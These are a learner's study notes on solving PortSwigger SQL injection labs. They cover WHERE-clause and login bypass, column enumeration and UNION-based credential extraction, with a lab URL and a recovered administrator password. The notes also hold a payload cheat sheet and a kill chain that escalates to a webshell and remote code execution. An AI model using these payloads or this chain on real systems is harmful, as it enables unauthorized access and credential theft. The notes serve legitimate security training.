# Day 15 Notes — PortSwigger SQL Injection Labs

---

## 1. What We Did Today Overview

- Moved from DVWA to real PortSwigger labs — closer to real bug bounty targets
- Completed 5 SQL injection labs covering the complete UNION attack methodology
- Bypassed a WHERE clause to reveal hidden products
- Bypassed login without knowing the password
- Found column count using both ORDER BY and UNION NULL methods
- Identified text-compatible columns using string injection
- Extracted real credentials from a users table and logged in as administrator
- Zero hints needed — all labs solved independently

---

## 2. Why PortSwigger Labs After DVWA

DVWA taught you the mechanics of SQLi in a controlled, obvious environment. PortSwigger labs teach you how SQLi appears in real applications:

- Real live websites hosted on PortSwigger's servers — not localhost
- Different database backends — PostgreSQL, MySQL, Oracle, SQLite
- Different injection contexts — WHERE clause, ORDER BY, UPDATE statements
- Realistic page structures — you have to find the vulnerability yourself
- Defined goals — not just "inject something" but "retrieve credentials and log in"

The progression is:
```
DVWA (understand the concept)
        ↓
PortSwigger Apprentice (apply it in realistic scenarios)
        ↓
PortSwigger Practitioner (handle defenses and complex contexts)
        ↓
Real bug bounty targets
```

---

## 3. Lab 1 — WHERE Clause Bypass: Retrieving Hidden Data

**Lab name:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### The foundation — what this vulnerability is

Web applications often filter database results using WHERE clauses. A product catalog might query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
The `released = 1` condition hides unreleased products from customers. Developers assume users will only ever submit category names. They never imagined someone would inject SQL syntax into the category parameter.

### What the injection does

**Normal request:**
```
/filter?category=Gifts
```
Query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Returns only released Gifts products.

**Injected request:**
```
/filter?category='+OR+1=1--
```
Query becomes:
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```
Breaking this down:
- `'` closes the category string
- `OR 1=1` adds a condition that is always true
- `--` comments out everything after — including `AND released = 1`
- Result: WHERE clause is always true → every product returned regardless of category or release status

### What we saw

Before injection: normal product count for the selected category
After injection with `'+OR+1=1--`: **12 products** appeared — all products from all categories including hidden unreleased ones

### The vulnerable code pattern
```php
// Vulnerable — input goes directly into query
$category = $_GET['category'];
$query = "SELECT * FROM products 
          WHERE category = '$category' AND released = 1";

// Fixed — parameterized query
$stmt = $pdo->prepare("SELECT * FROM products 
                        WHERE category = ? AND released = 1");
$stmt->execute([$category]);
```

### Key takeaway
The `--` comment character is the most powerful tool in SQLi. It lets you surgically remove any part of the original query that interferes with your injection. Everything after `--` is ignored by the database.

---

## 4. Lab 2 — Login Bypass Without Knowing the Password

**Lab name:** SQL injection vulnerability allowing login bypass

### The foundation — how login queries work

Most login forms query the database like this:
```sql
SELECT * FROM users 
WHERE username = 'admin' AND password = 'enteredpassword'
```
If the query returns a row — user is authenticated. If no rows — login fails. The vulnerability exists when the username or password field is injectable — you can manipulate the query to return a row without knowing the password.

### The injection

**Username field input:**
```
administrator'--
```
**Password field:** anything — `wrongpassword`

**Original query:**
```sql
SELECT * FROM users 
WHERE username = 'administrator' AND password = 'wrongpassword'
```

**After injection:**
```sql
SELECT * FROM users 
WHERE username = 'administrator'--' AND password = 'wrongpassword'
```

The `--` comments out `AND password = 'wrongpassword'` entirely. The query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator'
```
The database finds the administrator row and returns it. Application sees a valid row returned = authentication successful. Password was never checked.

### What we saw after login
Landed on **"My Account"** page — logged in as administrator. Full account access without knowing the password.

### Why this is devastating in real applications
- You only need to know the username — not the password
- If you don't know the username try: `admin'--`, `administrator'--`, `root'--`
- Or use `' OR 1=1--` as username to log in as the first user in the database
- No brute force needed — one request and you're in

### Real world impact
Login bypass via SQLi gives immediate authenticated access to the application as any user including administrators. Combined with an admin panel that has file upload — this leads directly to remote code execution. This is how many real breaches start.

---

## 5. Lab 3 — Finding the Number of Columns

**Lab name:** SQL injection UNION attack, determining the number of columns returned by the query

### The foundation — why column count matters

Before running a UNION attack you must know exactly how many columns the original query returns. Your UNION SELECT must have the exact same number of columns — otherwise the database throws an error and the attack fails.

You cannot guess — you must determine it precisely using one of two methods.

### Method 1 — ORDER BY

ORDER BY sorts results by column number. If you ORDER BY a column that doesn't exist — error. The last number that works = column count.

```
category=Gifts'+ORDER+BY+1--    → works
category=Gifts'+ORDER+BY+2--    → works
category=Gifts'+ORDER+BY+3--    → works
category=Gifts'+ORDER+BY+4--    → ERROR
```
Error on 4 = **3 columns confirmed.**

### Method 2 — UNION SELECT NULL

Add NULLs one at a time until no error:
```
category=Gifts'+UNION+SELECT+NULL--          → error
category=Gifts'+UNION+SELECT+NULL,NULL--     → error
category=Gifts'+UNION+SELECT+NULL,NULL,NULL--  → works
```
Works with 3 NULLs = **3 columns confirmed.**

### Why NULL instead of real values

NULL is compatible with every data type — string, integer, date, boolean. If you used a string like `'test'` in an integer column you'd get a data type error that would confuse your column count testing. NULL sidesteps all type issues.

### Result
Both methods confirmed **3 columns** in this lab's query.

### Why knowing the column count matters
```sql
-- Original query (3 columns):
SELECT name, description, price FROM products WHERE category = 'Gifts'

-- Correct UNION (3 columns — matches):
UNION SELECT username, password, NULL FROM users  ✓

-- Wrong UNION (2 columns — mismatch):
UNION SELECT username, password FROM users  ✗ ERROR
```

---

## 6. Lab 4 — Finding Text-Compatible Columns

**Lab name:** SQL injection UNION attack, finding a column containing text

### The foundation — why not every column works for output

Even when you know the column count not every column can display text. Columns that store integers, dates, or binary data will throw a type error if you inject a string into them. You need to find which specific column accepts string data — that column becomes your output channel for extracting data.

### The method — inject the target string into each position

The lab provided a specific string to find: `RV1aZ3`

Try the string in each column position while keeping others as NULL:

```
-- String in column 1:
'+UNION+SELECT+'RV1aZ3',NULL,NULL--    → type error or no output

-- String in column 2:
'+UNION+SELECT+NULL,'RV1aZ3',NULL--    → string appears on page ✓

-- String in column 3:
'+UNION+SELECT+NULL,NULL,'RV1aZ3'--    → not needed, already found
```

### The exact payload that worked

```
https://0a00006e033a5bf680c64e0600bc00d4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,%27RV1aZ3%27,NULL--
```

Decoded:
```
category=Corporate gifts' UNION SELECT NULL,'RV1aZ3',NULL--
```

The string `RV1aZ3` appeared on the page in column 2 position — confirming column 2 accepts string data.

### What this means for data extraction

Column 2 is the output channel. Any data you want to extract goes in position 2:
```sql
UNION SELECT NULL, username, NULL FROM users--
UNION SELECT NULL, password, NULL FROM users--
UNION SELECT NULL, table_name, NULL FROM information_schema.tables--
```

### The pattern for any target
```
1. Find column count (ORDER BY or UNION NULL)
2. Try target string in position 1, keep others NULL
3. If no output → try position 2
4. If no output → try position 3
5. Output column found → use it for all data extraction
```

---

## 7. Lab 5 — Full UNION Attack: Retrieving Real Credentials

**Lab name:** SQL injection UNION attack, retrieving data from other tables

### The foundation — putting it all together

This lab combines everything from Labs 3 and 4 into a complete end-to-end attack. The goal is to extract usernames and passwords from a `users` table and use them to log in as administrator.

### The attack flow

**Step 1 — Confirm injection:**
```
category=Gifts'--
```
No error = injectable.

**Step 2 — Find column count:**
```
category=Gifts'+ORDER+BY+1--
category=Gifts'+ORDER+BY+2--
category=Gifts'+ORDER+BY+3--  → error = 2 columns
```
2 columns confirmed.

**Step 3 — Find text columns:**
```
category=Gifts'+UNION+SELECT+'test',NULL--   → if works, col 1 is text
category=Gifts'+UNION+SELECT+NULL,'test'--   → if works, col 2 is text
```

**Step 4 — Extract data from users table:**
```
category=Gifts'+UNION+SELECT+username,password+FROM+users--
```

### The credentials extracted

```
administrator : uionszdqlalqymcb8668
```

Real credentials from the live database extracted using pure SQL injection.

**Step 5 — Login:**
Went to the login page → entered `administrator` / `uionszdqlalqymcb8668` → logged in successfully → lab solved.

### The complete UNION attack methodology — memorize this

```
1. Find injectable parameter — test with '
2. Find column count — ORDER BY until error
3. Confirm with UNION SELECT NULLs
4. Find text-compatible column — inject string into each position
5. Extract table names from information_schema
6. Extract column names from information_schema
7. Extract target data — usernames, passwords, sensitive data
8. Use extracted data — login, escalate, pivot
```

This exact flow works on any UNION-based SQL injection regardless of the application or database.

---

## 8. PortSwigger vs DVWA — Key Differences Observed

| | DVWA | PortSwigger Labs |
|---|---|---|
| Hosting | Local Docker container | Live servers on PortSwigger infrastructure |
| Finding the vuln | Obvious — you're told where it is | You explore the app to find injectable parameters |
| Database | MariaDB — uses `#` comment | PostgreSQL/MySQL — uses `--` comment |
| Goal | Learn the technique | Prove you can apply it end to end |
| Realism | Low — training wheels on | High — real app structure |
| Comment character | `#` worked on DVWA | `--` works on PortSwigger |

### Why the comment character matters
Different databases use different comment syntax:
| Database | Comment character |
|---|---|
| MySQL / MariaDB | `#` or `--` |
| PostgreSQL | `--` |
| Oracle | `--` |
| MSSQL | `--` |

Always try both `--` and `#` when testing. If one doesn't work try the other.

---

## 9. Chain Thinking — SQLi Full Kill Chain

### SQLi alone = Critical
Extracting credentials from a database is Critical severity on its own. But the real power is what comes after.

### The complete kill chain

```
SQLi found in product filter parameter
        ↓
UNION attack extracts users table
        ↓
Administrator credentials retrieved:
administrator:uionszdqlalqymcb8668
        ↓
Login to application as administrator
        ↓
Admin panel discovered — has file upload feature
        ↓
Upload PHP webshell (Day 13 technique)
        ↓
Remote Code Execution on server
        ↓
Read config files — find database credentials
        ↓
Direct database access — dump everything
        ↓
Complete server and application compromise
```

### What each step adds
| Step | Severity | What it adds |
|---|---|---|
| SQLi found | High | Read database contents |
| Admin credentials extracted | Critical | Full application access |
| Admin login achieved | Critical | Control over all users and data |
| File upload → webshell | Critical | OS command execution |
| RCE achieved | Critical+ | Pivot to internal network |

This is not theoretical — this exact chain has been used in real breaches. SQLi is often just the entry point, not the final impact.

---

## 10. Complete SQLi Methodology Reference

### Step 1 — Confirm injection
```sql
'                    -- syntax error confirms injection
''                   -- escaped quote — no error
' OR '1'='1          -- always true condition
' OR '1'='2          -- always false condition
```

### Step 2 — Find column count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--       -- error here = 2 columns
```

### Step 3 — Find text columns
```sql
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--
' UNION SELECT NULL,NULL,'test'--
```

### Step 4 — Extract database info
```sql
' UNION SELECT NULL,version()--              -- database version
' UNION SELECT NULL,database()--             -- current database name (MySQL)
' UNION SELECT NULL,current_database()--     -- current database (PostgreSQL)
```

### Step 5 — Extract table names
```sql
-- MySQL/MariaDB:
' UNION SELECT NULL,table_name FROM information_schema.tables 
WHERE table_schema=database()--

-- PostgreSQL:
' UNION SELECT NULL,table_name FROM information_schema.tables 
WHERE table_schema='public'--
```

### Step 6 — Extract column names
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns 
WHERE table_name='users'--
```

### Step 7 — Extract data
```sql
' UNION SELECT username,password FROM users--
```

### Login bypass
```sql
administrator'--          -- bypass with known username
' OR 1=1--                -- login as first user in database
' OR '1'='1'--            -- alternative always-true condition
```

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| WHERE clause injection | Injecting into a filter parameter to manipulate which rows are returned |
| `OR 1=1` | Always-true condition — makes WHERE clause return all rows |
| `--` | SQL comment character — removes everything after it from the query |
| Login bypass | Commenting out the password check — authenticates without knowing password |
| Column count | Number of columns the original query returns — must match UNION SELECT |
| ORDER BY method | Increasing column number until error — identifies column count |
| UNION NULL method | Adding NULLs until no error — confirms column count |
| NULL in UNION | Compatible with any data type — avoids type mismatch errors |
| Text-compatible column | Column that accepts string data — used as output channel |
| information_schema | Built-in database containing metadata about all tables and columns |
| Kill chain | Chaining multiple vulnerabilities to achieve maximum impact |

---

## 12. Foundation Checklist

Before moving to Day 16 confirm you can answer all of these from memory:

```
Why does commenting out with -- work in SQL injection?
What does OR 1=1 do to a WHERE clause and why?
Why does login bypass work without knowing the password?
Why do you use NULL in UNION SELECT instead of strings?
How do you find which column accepts string data?
What is information_schema and why do attackers always query it?
What is the complete UNION attack methodology from start to finish?
How does SQLi connect to RCE in a kill chain?
```

---
